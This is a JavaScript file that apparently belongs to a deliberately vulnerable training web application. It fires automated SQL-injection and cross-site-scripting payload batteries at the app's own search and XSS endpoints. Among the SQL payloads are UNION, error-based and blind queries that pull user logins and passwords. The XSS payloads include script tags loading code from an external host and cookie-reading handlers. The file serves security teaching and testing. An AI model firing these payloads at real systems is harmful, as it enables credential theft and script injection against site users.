var htmlEscape = function(str) {
  return str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

var addToResults = function(data, test) {
  var response = data.response,
    msg = data.msg,
    response_data = '',
    className = 'bg-success',
    original_request = response.original_request;

  if (response.data && response.data.length) {
    response_data = JSON.stringify(response.data);
  }
  if (msg === "Internal Error") {
    className = 'bg-danger';
  }

  if(test === "#automated_results_xss") {
    original_request = htmlEscape(response.original_request)
  }

  $(test).append(
    `<div class="${className} lead">
        <p>Request: ${original_request}</p>
        <p>Response: ${response_data}</p>
      </div>`
  )
}

var sendRequest = function(val, url, id) {
  return $.ajax({
    type: "POST",
    url: url,
    data: JSON.stringify({
      value: val
    }),
    success: function(data) {
      addToResults(data, id)
    },
    error: function(data) {
      addToResults(data, id)
    },
    dataType: "json",
    contentType: "application/json"
  })
}

$('#runSQLTest').on('click', function() {
  var self = this;
  $(this).addClass('disabled');
  $('#automated_results_sql').html('');
  $.when(
    sendRequest("-'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' ''", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' &'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' ^'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("'*'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or ''-'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or '' '", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or ''&'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or ''^'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or ''*'", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\"-\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" \"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\"&\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\"^\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\"*\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or \"\"-\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or \"\" \"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or \"\"&\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or \"\"^\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or \"\"*\"", "/app/usersearch", "#automated_results_sql"),
    sendRequest("or true--", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\" or true--", "/app/usersearch", "#automated_results_sql"),
    sendRequest("' or true--", "/app/usersearch", "#automated_results_sql"),
    sendRequest("\") or true--", "/app/usersearch", "#automated_results_sql"),
    sendRequest("test", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' UNION ALL SELECT NULL,version() #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("someone@test.com", "/app/usersearch", '#automated_results_sql'),
    sendRequest("This is some test \"DATA 'testind'\"", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("%27 Some test data", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME=\"users\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"table1\" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT version()),1,1))) > 52 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (SELECT version()) LIKE \"5 %\" #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND sleep(10) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF((SELECT version()) LIKE \"5 %\",sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_sql'),
    sendRequest("'", "/app/usersearch", '#automated_results_sql')
  ).then(function() {
    $(self).removeClass('disabled');
  });
});

$('#runXSSTest').on('click', function() {
  var self = this;
  $(this).addClass('disabled');
  $('#automated_results_xss').html('');
  $.when(
    sendRequest("'';!--\"<XSS>= & {()}", "app/xss", "#automated_results_xss"),
    sendRequest(" <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"javascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=JaVaScRiPt:alert('XSS')>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=`javascript:alert(\"RSnake says,'XSS'\")`>", "app/xss", "#automated_results_xss"),
    sendRequest(" <a onmouseover=\"alert(document.cookie)\">xxs link</a>", "app/xss", "#automated_results_xss"),
    sendRequest("<a onmouseover=alert(document.cookie)>xxs link</a>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=# onmouseover=\"alert('xxs')\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG onmouseover=\" alert('xxs')\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\" /\" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"/x\" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"/\" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"/x\" onerror=\"jav ascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"/\" onerror=\"jav & #x09;ascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"jav & #x0A;ascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC=\"/x\" onerror=\"jav & #x0D;ascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest(" <SCRIPT/XSS SRC=\"http: //ha.ckers.org/xss.js\"></SCRIPT>", "app/xss", "#automated_results_xss"),
    sendRequest("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "app/xss", "#automated_results_xss"),
    sendRequest("<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >", "app/xss", "#automated_results_xss"),
    sendRequest("<SCRIPT SRC=//ha.ckers.org/.j>", "app/xss", "#automated_results_xss"),
    sendRequest("<iframe src=http://ha.ckers.org/scriptlet.html <", "app/xss", "#automated_results_xss"),
    sendRequest("</TITLE><SCRIPT>alert(\"XSS \");</SCRIPT>", "app/xss", "#automated_results_xss"),
    sendRequest("<INPUT TYPE=\"IMAGE\" SRC=\"javascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<BODY BACKGROUND=\"javascript: alert('XSS')\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG DYNSRC=\"javascript: alert('XSS')\">", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG LOWSRC=\"javascript: alert('XSS')\">", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE>li {list-style-image: url(\"javascript: alert('XSS')\");}</STYLE><UL><LI>XSS</br>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG SRC='vbscript:msgbox(\"XSS\")'>", "app/xss", "#automated_results_xss"),
    sendRequest("<BODY ONLOAD=alert('XSS')>", "app/xss", "#automated_results_xss"),
    sendRequest("<BGSOUND SRC=\"javascript: alert('XSS');\"", "app/xss", "#automated_results_xss"),
    sendRequest("<LINK REL=\"stylesheet\" HREF=\"javascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<LINK REL=\"stylesheet\" HREF=\"http: //ha.ckers.org/xss.css\">", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "app/xss", "#automated_results_xss"),
    sendRequest(" <META HTTP-EQUIV=\"Link\" Content=\"< http://ha.ckers.org/xss.css>; REL=stylesheet\">", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE>BODY{-moz-binding:url(\"http: //ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>", "app/xss", "#automated_results_xss"),
    sendRequest("<IMG STYLE=\"xss: expr /*XSS*/ ession(alert('XSS'))\"", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "app/xss", "#automated_results_xss"),
    sendRequest("<STYLE>.XSS{background-image:url(\"javascript: alert('XSS')\");}</STYLE><A CLASS=XSS></A>", "app/xss", "#automated_results_xss"),
    sendRequest("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url = javascript: alert('XSS');\">", "app/xss", "#automated_results_xss"),
    sendRequest("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url = data: text / html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "app/xss", "#automated_results_xss")
  ).then(function() {
    $(self).removeClass('disabled');
  });
});
